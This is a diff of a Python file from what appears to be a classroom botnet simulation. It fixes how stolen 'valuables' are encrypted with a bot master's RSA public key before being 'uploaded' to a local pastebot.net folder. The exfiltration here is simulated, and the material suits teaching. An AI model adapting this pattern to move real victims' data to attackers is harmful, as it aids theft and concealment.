@@ -1,6 +1,6 @@
 import os
 from Crypto.PublicKey import RSA
-from Crypto.Signature import PKCS1_v1_5
+from Crypto.Cipher import PKCS1_v1_5
 from Crypto.Hash import SHA
 
 # Instead of storing files on disk,
@@ -18,14 +18,16 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
     hashed_data = SHA.new(data);
-    return masters_public_key.encrypt(data, hashed_data);
+
+    pkcs_cipher = PKCS1_v1_5.new(masters_public_key);
+    return pkcs_cipher.encrypt(data) + bytes(hashed_data.hexdigest(), "ascii");
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
     valuable_data = "\n".join(valuables)
     valuable_data = bytes(valuable_data, "ascii")
     # encrypted_master is a "tuple" data structure, the first section is what we want
-    encrypted_master = encrypt_for_master(valuable_data)[0]
+    encrypted_master = encrypt_for_master(valuable_data)
 
     # "Upload" it to pastebot (i.e. save in pastebot folder)
     f = open(os.path.join("pastebot.net", fn), "wb")
